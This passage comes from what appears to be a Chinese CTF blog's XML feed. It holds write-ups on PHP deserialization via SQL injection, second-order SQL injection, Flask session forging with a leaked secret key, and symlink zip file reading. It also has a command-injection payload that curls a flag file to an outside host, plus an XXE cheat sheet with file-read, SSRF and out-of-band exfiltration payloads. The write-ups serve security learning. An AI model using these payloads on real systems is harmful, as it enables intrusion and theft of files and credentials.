class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;&quot;</span>);&#125;    <span class="hljs-variable">$title</span> = str_replace(<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$ext</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$filename</span>);<span class="hljs-comment"># 只取文件名</span>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;title&#x27;</span>=&gt;<span class="hljs-variable">$title</span>,<span class="hljs-string">&#x27;filename&#x27;</span>=&gt;<span class="hljs-variable">$basename</span>.<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$ext</span>,<span class="hljs-string">&#x27;ext&#x27;</span>=&gt;<span class="hljs-variable">$ext</span>,<span class="hljs-string">&#x27;path&#x27;</span>=&gt;<span class="hljs-keyword">$this</span>-&gt;folder.<span class="hljs-variable">$basename</span>.<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$ext</span>);&#125;<span class="hljs-comment">#  返回了 title 文件名  filename 随机生成的+后缀   ext 后缀 path 储存路径  </span><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">if</span>(!<span class="hljs-variable">$data</span> || !is_array(<span class="hljs-variable">$data</span>))&#123;<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Something wrong!&quot;</span>);&#125;<span class="hljs-variable">$id</span> = <span class="hljs-keyword">$this</span>-&gt;insert_array(<span class="hljs-variable">$data</span>);<span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;&#125;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">insert_array</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><span class="hljs-function"></span>&#123;<span class="hljs-comment"># 储存信息去数据库</span><span class="hljs-variable">$con</span> = mysqli_connect(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;pic_base&quot;</span>);<span class="hljs-keyword">if</span> (mysqli_connect_errno(<span class="hljs-variable">$con</span>)) &#123;     <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connect MySQL Fail:&quot;</span>.mysqli_connect_error());&#125;<span class="hljs-variable">$sql_fields</span> = <span class="hljs-keyword">array</span>();<span class="hljs-variable">$sql_val</span> = <span class="hljs-keyword">array</span>();<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$value</span>)&#123;<span class="hljs-variable">$key_temp</span> = str_replace(chr(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.chr(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-variable">$key</span>);<span class="hljs-variable">$value_temp</span> = str_replace(chr(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.chr(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-variable">$value</span>);<span class="hljs-variable">$sql_fields</span>[] = <span class="hljs-string">&quot;`&quot;</span>.<span class="hljs-variable">$key_temp</span>.<span class="hljs-string">&quot;`&quot;</span>;  <span class="hljs-comment"># 键</span><span class="hljs-variable">$sql_val</span>[] = <span class="hljs-string">&quot;&#x27;&quot;</span>.<span class="hljs-variable">$value_temp</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>;   <span class="hljs-comment"># 值  这个值都是加了 &#x27;&#x27; insert 的是字符，后面拼接的时候要注意</span>&#125;<span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO images (&quot;</span>.(implode(<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-variable">$sql_fields</span>)).<span class="hljs-string">&quot;) VALUES(&quot;</span>.(implode(<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-variable">$sql_val</span>)).<span class="hljs-string">&quot;)&quot;</span>;<span class="hljs-comment"># 高宽是存的反序列化，后面show会有反序列化 序列化构造helper类  要保证ifview = true config= /flag</span><span class="hljs-comment">#&quot;a&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,0x4f3a363a2268656c706572223a323a7b733a393a22002a00696676696577223b623a313b733a393a22002a00636f6e666967223b733a353a222f666c6167223b7d)#&quot;</span>mysqli_query(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql</span>);<span class="hljs-variable">$id</span> = mysqli_insert_id(<span class="hljs-variable">$con</span>);mysqli_close(<span class="hljs-variable">$con</span>);<span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;&#125;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">view_files</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>)</span>&#123;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;ifview == <span class="hljs-literal">False</span>)&#123;<span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>;<span class="hljs-comment">//The function is not yet perfect, it is not open yet.</span>&#125;<span class="hljs-variable">$content</span> = file_get_contents(<span class="hljs-variable">$path</span>);<span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment"># Read some config html</span><span class="hljs-keyword">$this</span>-&gt;view_files(<span class="hljs-keyword">$this</span>-&gt;config);&#125;&#125;<span class="hljs-meta">?&gt;</span> <span class="hljs-meta">&lt;?php</span><span class="hljs-comment"># show.php</span><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;./helper.php&quot;</span>);<span class="hljs-variable">$show</span> = <span class="hljs-keyword">new</span> show();<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;delete_all&quot;</span>])&#123;<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;delete_all&quot;</span>] == <span class="hljs-string">&quot;true&quot;</span>)&#123;<span class="hljs-variable">$show</span>-&gt;Delete_All_Images();&#125;&#125;<span class="hljs-variable">$show</span>-&gt;Get_All_Images();<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">show</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-variable">$con</span>;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-keyword">$this</span>-&gt;con = mysqli_connect(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;pic_base&quot;</span>);<span class="hljs-keyword">if</span> (mysqli_connect_errno(<span class="hljs-keyword">$this</span>-&gt;con))&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connect MySQL Fail:&quot;</span>.mysqli_connect_error());&#125;&#125;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Get_All_Images</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM images&quot;</span>;<span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-keyword">$this</span>-&gt;con, <span class="hljs-variable">$sql</span>);<span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>-&gt;num_rows &gt; <span class="hljs-number">0</span>)&#123;    <span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;fetch_assoc())&#123;    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;attr&quot;</span>])&#123;    <span class="hljs-variable">$attr_temp</span> = str_replace(<span class="hljs-string">&#x27;\0\0\0&#x27;</span>, chr(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.chr(<span class="hljs-number">0</span>), <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;attr&quot;</span>]);<span class="hljs-variable">$attr</span> = unserialize(<span class="hljs-variable">$attr_temp</span>);&#125;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;id=&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;id&quot;</span>].<span class="hljs-string">&quot; filename=&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;filename&quot;</span>].<span class="hljs-string">&quot; path=&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;path&quot;</span>].<span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>;    &#125;&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;&quot;</span>;&#125;mysqli_close(<span class="hljs-keyword">$this</span>-&gt;con);&#125;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Delete_All_Images</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;DELETE FROM images&quot;</span>;<span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-keyword">$this</span>-&gt;con, <span class="hljs-variable">$sql</span>);&#125;&#125;<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span><span class="hljs-comment"># upload.php</span><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;./helper.php&quot;</span>);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">upload</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">helper</span> </span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_base</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-keyword">$this</span>-&gt;upload();&#125;&#125;<span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>)&#123;<span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>])&#123;<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Upload file failed.&quot;</span>);&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> upload();<span class="hljs-variable">$file</span>-&gt;upload_base();<span class="hljs-comment"># 进upload_base()看看  到hepler的upload()</span>&#125;&#125;<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> helper();<span class="hljs-meta">?&gt;</span>序列化的构造脚本<span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">helper</span> </span>&#123;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$ifview</span> = <span class="hljs-literal">True</span>;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$config</span> = <span class="hljs-string">&quot;/flag&quot;</span>;&#125;<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> helper();<span class="hljs-keyword">echo</span> bin2hex(serialize(<span class="hljs-variable">$a</span>));<span class="hljs-comment"># 构造 a&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,&#x27;1&#x27;,0x4f3a363a2268656c706572223a323a7b733a393a22002a00696676696577223b623a313b733a393a22002a00636f6e666967223b733a353a222f666c6167223b7d)#.png 上传即可</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>二次注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二次注入</title>
    <link href="/2020/04/10/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"/>
    <url>/2020/04/10/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="网鼎杯2018-Unfinish"><a href="#网鼎杯2018-Unfinish" class="headerlink" title="[网鼎杯2018]Unfinish"></a>[网鼎杯2018]Unfinish</h1><p>注册后能显示姓名，在这个地方有二次注入</p><pre><code class="hljs sql">email=test@666.com&amp;username=0&#x27;+(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">substr</span>(<span class="hljs-keyword">hex</span>(<span class="hljs-keyword">hex</span>((<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>*<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>flag)))<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>&#123;&#125;<span class="hljs-comment">/**/</span><span class="hljs-keyword">for</span><span class="hljs-comment">/**/</span><span class="hljs-number">10</span>))+<span class="hljs-string">&#x27;0&amp;password=test</span></code></pre><p>为什么有两次hex  因为要保证hex出来的全是数字，没有字母</p><p><a href="https://www.secpulse.com/archives/74776.html">https://www.secpulse.com/archives/74776.html</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>二次注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[SWPU2019]Web3</title>
    <link href="/2020/04/08/SWPU2019-Web3/"/>
    <url>/2020/04/08/SWPU2019-Web3/</url>
    
    <content type="html"><![CDATA[<h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><ol><li><p>随意输入都能登录  查看源码有一处注释可疑</p><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--</span><span class="hljs-comment">404 not found</span><span class="hljs-comment">--&gt;</span></code></pre><p>随便输入访问到404页面，放到burp查看相应包</p><p><code>Swpuctf_csrf_token: U0VDUkVUX0tFWTprZXlxcXF3d3dlZWUhQCMkJV4mKg==</code></p><p>base64解密为 SECRET_KEY:keyqqqwwweee!@#$%^&amp;*</p></li><li><p>脚本直接伪造admin</p><pre><code class="hljs csp">python flask_session_cookie_manager3.py decode -c <span class="hljs-string">&#x27;eyJpZCI6eyIgYiI6Ik1UQXcifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoicSIsInVzZXJuYW1lIjoiMTIzIn0.Xo3RYQ.WSpp6_ZvPfQfdlnAX3ZbtSnEOS0&#x27;</span> -s <span class="hljs-string">&#x27;keyqqqwwweee!@#$%^&amp;*&#x27;</span>&#123;<span class="hljs-string">&#x27;id&#x27;</span>: b<span class="hljs-string">&#x27;100&#x27;</span>, <span class="hljs-string">&#x27;is_login&#x27;</span>: True, <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;123&#x27;</span>&#125;python flask_session_cookie_manager3.py encode -s <span class="hljs-string">&#x27;keyqqqwwweee!@#$%^&amp;*&#x27;</span> -t &quot;&#123;<span class="hljs-string">&#x27;id&#x27;</span>: b<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;is_login&#x27;</span>: True, <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;123&#x27;</span>&#125;&quot;eyJpZCI6eyIgYiI6Ik1RPT0ifSwiaXNfbG9naW4iOnRydWUsInBhc3N3b3JkIjoicSIsInVzZXJuYW1lIjoiMTIzIn0.Xo3SLw.lL3TAbVjmsDo65DOZhUNjrM8hkc</code></pre></li><li><p>成功到上传界面，源码有注释</p><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">upload</span>():</span>    <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;id&#x27;</span>] != <span class="hljs-string">b&#x27;1&#x27;</span>:        <span class="hljs-keyword">return</span> render_template_string(temp)    <span class="hljs-keyword">if</span> request.method==<span class="hljs-string">&#x27;POST&#x27;</span>:        m = hashlib.md5()        name = session[<span class="hljs-string">&#x27;password&#x27;</span>]        name = name+<span class="hljs-string">&#x27;qweqweqwe&#x27;</span>        name = name.encode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)        m.update(name)        md5_one= m.hexdigest()        n = hashlib.md5()        ip = request.remote_addr        ip = ip.encode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)        n.update(ip)        md5_ip = n.hexdigest()        f=request.files[<span class="hljs-string">&#x27;file&#x27;</span>]        basepath=os.path.dirname(os.path.realpath(__file__))        path = basepath+<span class="hljs-string">&#x27;/upload/&#x27;</span>+md5_ip+<span class="hljs-string">&#x27;/&#x27;</span>+md5_one+<span class="hljs-string">&#x27;/&#x27;</span>+session[<span class="hljs-string">&#x27;username&#x27;</span>]+<span class="hljs-string">&quot;/&quot;</span>        path_base = basepath+<span class="hljs-string">&#x27;/upload/&#x27;</span>+md5_ip+<span class="hljs-string">&#x27;/&#x27;</span>        filename = f.filename        pathname = path+filename        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;zip&quot;</span> != filename.split(<span class="hljs-string">&#x27;.&#x27;</span>)[-<span class="hljs-number">1</span>]:            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;zip only allowed&#x27;</span>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(path_base):            <span class="hljs-keyword">try</span>:                os.makedirs(path_base)            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(path):            <span class="hljs-keyword">try</span>:                os.makedirs(path)            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(pathname):            <span class="hljs-keyword">try</span>:                f.save(pathname)            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>        <span class="hljs-keyword">try</span>:            cmd = <span class="hljs-string">&quot;unzip -n -d &quot;</span>+path+<span class="hljs-string">&quot; &quot;</span>+ pathname            <span class="hljs-keyword">if</span> cmd.find(<span class="hljs-string">&#x27;|&#x27;</span>) != -<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> cmd.find(<span class="hljs-string">&#x27;;&#x27;</span>) != -<span class="hljs-number">1</span>:waf()                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>            os.system(cmd)        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>        unzip_file = zipfile.ZipFile(pathname,<span class="hljs-string">&#x27;r&#x27;</span>)        unzip_filename = unzip_file.namelist()[<span class="hljs-number">0</span>]        <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;is_login&#x27;</span>] != <span class="hljs-literal">True</span>:            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;not login&#x27;</span>        <span class="hljs-keyword">try</span>:            <span class="hljs-keyword">if</span> unzip_filename.find(<span class="hljs-string">&#x27;/&#x27;</span>) != -<span class="hljs-number">1</span>:                shutil.rmtree(path_base)                os.mkdir(path_base)                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>            image = <span class="hljs-built_in">open</span>(path+unzip_filename, <span class="hljs-string">&quot;rb&quot;</span>).read()            resp = make_response(image)            resp.headers[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] = <span class="hljs-string">&#x27;image/png&#x27;</span>            <span class="hljs-keyword">return</span> resp        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:            shutil.rmtree(path_base)            os.mkdir(path_base)            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;error&#x27;</span>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;upload.html&#x27;</span>)<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/showflag&#x27;</span></span>)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">showflag</span>():</span>    <span class="hljs-keyword">if</span> <span class="hljs-literal">True</span> == <span class="hljs-literal">False</span>:        image = <span class="hljs-built_in">open</span>(os.path.join(<span class="hljs-string">&#x27;./flag/flag.jpg&#x27;</span>), <span class="hljs-string">&quot;rb&quot;</span>).read()        resp = make_response(image)        resp.headers[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] = <span class="hljs-string">&#x27;image/png&#x27;</span>        <span class="hljs-keyword">return</span> resp    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;can&#x27;t give you&quot;</span></code></pre><p>可以看到flag在/flag/flag.jpg</p></li><li><p>软链接读文件，关键在于怎么获取到flag.jpg绝对路径</p><p>在 linux 中，<code>/proc/self/cwd/</code>会指向进程的当前目录，那么在不知道 flask 工作目录时，我们可以用<code>/proc/self/cwd/flag/flag.jpg</code>来访问 flag.jpg</p><pre><code class="hljs awk">ln -s <span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/cwd/</span>flag/flag.jpg qwezip -ry qwe.zip qwe</code></pre><p>或者先找到当前目录路径</p><p>在 linux 中，<code>/proc/self/environ</code>文件里包含了进程的环境变量，可以从中获取 flask 应用的绝对路径，再通过绝对路径制作软链接来读取 flag.jpg (PS：在浏览器中，我们无法直接看到<code>/proc/self/environ</code>的内容，只需要下载到本地，用 notepad++打开即可)</p><pre><code class="hljs tcl">ln -s /<span class="hljs-keyword">proc</span>/self/environ<span class="hljs-title"> qqq</span><span class="hljs-title"></span> <span class="hljs-title">  zip</span> -ry<span class="hljs-title"> qqq.zip</span> qqqln -s /ctf/hgfjakshgfuasguiasguiaaui/myflask/flag/flag.jpg<span class="hljs-title"> www</span><span class="hljs-title"></span> <span class="hljs-title">  zip</span> -ry<span class="hljs-title"> www.zip</span> www</code></pre><p>也可以命令注入：</p><pre><code class="hljs arcade">$(III=<span class="hljs-string">`awk &#x27;BEGIN&#123;printf \&quot;%c\&quot;, 47&#125;&#x27;`</span>&amp;&amp;curl xxx.xxx.xxx.xxx:<span class="hljs-number">9999</span> -T <span class="hljs-string">`echo <span class="hljs-subst">$&#123;III&#125;</span>ctf<span class="hljs-subst">$&#123;III&#125;</span>hgfjakshgfuasguiasguiaaui<span class="hljs-subst">$&#123;III&#125;</span>myflask<span class="hljs-subst">$&#123;III&#125;</span>flag<span class="hljs-subst">$&#123;III&#125;</span>flag.jpg`</span>).zip</code></pre></li></ol><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.anquanke.com/post/id/194640">https://www.anquanke.com/post/id/194640</a></p><p><a href="https://lihuaiqiu.github.io/2019/12/11/SWPU2019-Web%E9%A2%98%E8%A7%A3/">https://lihuaiqiu.github.io/2019/12/11/SWPU2019-Web题解/</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>flask session伪造</tag>
      
      <tag>软链接/命令注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xxe总结篇</title>
    <link href="/2020/04/08/xxe%E6%80%BB%E7%BB%93%E7%AF%87/"/>
    <url>/2020/04/08/xxe%E6%80%BB%E7%BB%93%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://portswigger.net/web-security/xxe">https://portswigger.net/web-security/xxe</a></p><p><a href="https://xz.aliyun.com/t/3357#toc-11">https://xz.aliyun.com/t/3357#toc-11</a></p></blockquote><h2 id="攻击类型"><a href="#攻击类型" class="headerlink" title="攻击类型"></a>攻击类型</h2><ul><li><p>读文件</p><pre><code class="hljs xml">通用实体：<span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">foo</span> [ <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">stockCheck</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">productId</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">productId</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">stockCheck</span>&gt;</span>参数实体：<span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> <span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">roottag</span> [</span><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">start</span> <span class="hljs-meta-string">&quot;&lt;![CDATA[&quot;</span>&gt;</span>   </span><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">goodies</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///d:/test.txt&quot;</span>&gt;</span>  </span><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">end</span> <span class="hljs-meta-string">&quot;]]&gt;&quot;</span>&gt;</span>  </span><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">dtd</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://ip/evil.dtd&quot;</span>&gt;</span> </span><span class="hljs-meta">%dtd; ]&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">roottag</span>&gt;</span><span class="hljs-symbol">&amp;all;</span><span class="hljs-tag">&lt;/<span class="hljs-name">roottag</span>&gt;</span>evil.dtd放自己服务器  //或者可以系统自己的dtd  如ubuntu系统自带/usr/share/yelp/dtd/docbookx.dtd文件<span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span> <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">all</span> <span class="hljs-meta-string">&quot;%start;%goodies;%end;&quot;</span>&gt;</span></code></pre></li><li><p>导致SSRF</p><pre><code class="hljs xml">可以先尝试读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host 文件  获取内网的情况<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">foo</span> [ <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://internal.vulnerable-website.com/&quot;</span>&gt;</span> ]&gt;</span></code></pre></li><li><p>Blind OOB XXE  无回显</p><pre><code class="hljs mojolicious"><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">convert</span> [ </span></span><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">remote</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://ip/test.dtd&quot;</span>&gt;</span></span><span class="perl">%remote;%int;%send;</span><span class="xml">]&gt;</span><span class="xml">test.dtd 放自己服务器</span><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;</span>&gt;</span></span><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">int</span> <span class="hljs-meta-string">&quot;&lt;!ENTITY &amp;#36; send SYSTEM &#x27;http://ip:9999?p=%file;&#x27;&gt;&quot;</span>&gt;</span></span></code></pre></li><li><p>文件上传</p><p>java相关 可以去xz的文章看看</p></li><li><p>做到题目再来加qvq</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>XXE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一些函数的trick</title>
    <link href="/2020/04/08/%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%E7%9A%84%E7%BB%95%E8%BF%87%E6%94%B6%E9%9B%86/"/>
    <url>/2020/04/08/%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%E7%9A%84%E7%BB%95%E8%BF%87%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<ol><li><p>basename() 函数返回路径中的文件名部分。会去掉文件名开头的非ASCII值从而绕过正则</p><p>[Zer0pts2020]Can you guess it?</p><p><code>/index.php/config.php/%ff?source</code></p></li></ol>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>知识点总结</tag>
      
      <tag>函数trick</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[RCTF 2019]Nextphp</title>
